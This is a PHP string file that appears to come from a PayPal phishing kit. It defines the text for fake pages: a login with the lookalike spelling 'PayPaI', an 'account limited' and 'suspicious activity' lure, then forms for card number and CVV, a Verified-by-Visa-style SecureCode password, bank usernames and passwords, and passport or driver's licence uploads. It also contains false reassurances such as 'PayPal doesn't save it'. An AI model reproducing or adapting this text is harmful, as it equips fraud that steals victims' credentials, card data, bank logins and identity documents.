<?php
#LOGIN
$wiz_111 = 'Log in to your PayPaI account';
$wiz_222 = 'Having trouble logging in?';
$wiz_333 = 'Sign Up';
$wiz_444 = 'All Rights Reserved To PayPal Inc';
$wiz_900 = 'Email';
$wiz_901 = 'Password';
$wiz_902 = 'Log In';
#INFO
$wiz_555 = 'Profile';
$wiz_666 = 'Update Your photo';
$wiz_777 = 'Hi Again!';
$wiz_888 = 'Your PayPal Account Has Been Limited!';
$wiz_999 = 'Required Information';
$wiz_903 = 'First Name';
$wiz_904 = 'Last Name';
$wiz_905 = 'Address';
$wiz_906 = 'City';
$wiz_907 = 'State';
$wiz_910 = 'ZIP';
$wiz_911 = 'Phone Number';

#-----NAV
$wiz_101 = 'Summary';
$wiz_102 = 'Activity';
$wiz_103 = 'Transfer';
$wiz_104 = 'Wallet';
$wiz_105 = 'Magasiner';
$wiz_106 = 'Log Out';
$wiz_107 = 'Main Menu';
$wiz_108 = 'Account';
$wiz_109 = 'Security';
$wiz_112 = 'Payments';
$wiz_113 = 'Notifications';
#------FOOTER
$wiz_114 = 'HELP/CONTACT US';
$wiz_115 = 'SECURITY';
$wiz_116 = 'All Rights Reserved.';
$wiz_117 = 'Respect for privacy';
$wiz_118 = 'Legal Agreements';
$wiz_119 = 'Comments';
#-------CCV
$wiz_120 = 'Credit Card';
$wiz_121 = 'Name on Card';
$wiz_123 = 'Card Number';
$wiz_124 = "Exp.";
$wiz_125 = 'CVV (3-4) code';
$wiz_126 = 'Address Line';
$wiz_127 = 'Confirm and Processes';
#--------VBV
$wiz_128 = 'Welcome to Verification™';
$wiz_129 = 'Please enter the information below to verify your identity.';
$wiz_130 = 'Card Expiration Date:';
$wiz_131 = 'Card Validation Code:';
$wiz_132 = 'Birth Date:';
$wiz_133 = 'Password or SecureCode(3d) :';
$wiz_134 = 'All rights reserved.';
#--------BANK
$wiz_135 = 'Choose from one of these commun banks';
$wiz_136 = 'Secure';
$wiz_137 = 'I have a different bank';
$wiz_138 = "It's safe to share this information. PayPal doesn't save it.";
$wiz_139 = 'By clicking';
$wiz_140 = 'Continue';
$wiz_141 = 'I agree to the terms and conditions for linking my bank account.';
$wiz_142 = 'Your Bank';
$wiz_143 = "It's safe to share this information. PayPal doesn't save it.";
$wiz_144 = 'Username';
$wiz_145 = 'Password';
$wiz_146 = 'By clicking';
$wiz_147 = 'Continue';
$wiz_148 = 'I agree to the terms and conditions for linking my bank account.';
$wiz_149 = 'Your Bank';
$wiz_150 = 'Name Bank';
#--------Loading AND Police
$wiz_151 = 'Processing';
$wiz_152 = 'Suspicious Activities - Payapl';
$wiz_153 = 'To help protect your account we regularly look for early signs of potentially fraudulent activity.';
$wiz_154 = 'We’re concerned about potential unauthorized activity';
$wiz_155 = 'After you confirm your identity, we’ll walk you through steps to make your account more secure.';
$wiz_156 = 'Login from Unknown device';
$wiz_157 = 'near Ossining, US';
$wiz_158 = 'Just to be safe, we want to make sure that this is your account.';
$wiz_159 = 'Contact';
$wiz_160 = 'Security';
$wiz_161 = 'Logout';
$wiz_162 = 'The following steps, you must fully filled it to maintain the safety of your account over and that he is not a breakthrough';
#--------UPLOAD CART ID
$wiz_163 = 'Confirm your identity';
$wiz_164 = 'Select';
$wiz_165 = 'Upload proof of identity( Recommended )';
$wiz_166 = 'Receive a text';
$wiz_167 = 'Receive an automated phone call';
$wiz_168 = 'Error this option not available for a moment Try other options ';
$wiz_169 = 'Which type of document will you upload?';
$wiz_170 = 'Show file requirements';
$wiz_171 = 'Files should be smaller than 10 MB.';
$wiz_172 = 'Use one of these file types: JPG, GIF, PNG, or PDF.';
$wiz_173 = 'Upload files that display up-to-date and legible details.';
$wiz_174 = 'Select any one ';
$wiz_175 = "Driver's License";
$wiz_176 = 'Passport';
$wiz_177 = 'Military ID';
?>